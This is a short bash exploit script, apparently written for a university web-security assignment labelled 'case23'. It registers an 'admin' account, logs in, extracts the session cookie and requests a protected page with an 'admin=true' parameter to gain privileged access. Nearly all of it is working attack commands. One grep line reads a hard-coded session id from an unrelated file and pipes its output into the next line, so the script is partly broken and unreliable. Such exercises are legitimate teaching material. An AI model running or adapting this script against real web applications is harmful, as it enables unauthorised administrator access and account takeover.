#!/usr/bin/env bash

echo "Executing exploit for 23 task"

curl -s -o /dev/null 'http://iu.ru/Assignment/case23/register.php' --data 'username=admin&email=johujujyvu%40mailinator.net&password=&confirmpwd=&p=8ea045631a6f722fe9c1473a54b3b1055936f4d85c942a74aa2e37e1d5c22d1e5339a375339b8d3d572fb7d61997ef67a9af0fc14487d9e204e2755d37501766'
curl  -s -o /dev/null --cookie-jar - 'http://iu.ru/Assignment/case23/includes/process_login.php' --data 'email=johujujyvu%40mailinator.net&password=&p=8ea045631a6f722fe9c1473a54b3b1055936f4d85c942a74aa2e37e1d5c22d1e5339a375339b8d3d572fb7d61997ef67a9af0fc14487d9e204e2755d37501766' > temp.txt
grep -Po '^sec_session_id23	ilnk3sqqh853drub5tft3ikt96' hi.html |
session="$(grep -oP 'sec_session_id23\s+\K\S+' temp.txt)"
curl 'http://iu.ru/Assignment/case23/protected_page.php?admin=true' -H "Cookie: sec_session_id23=$(echo $session)"
rm temp.txt
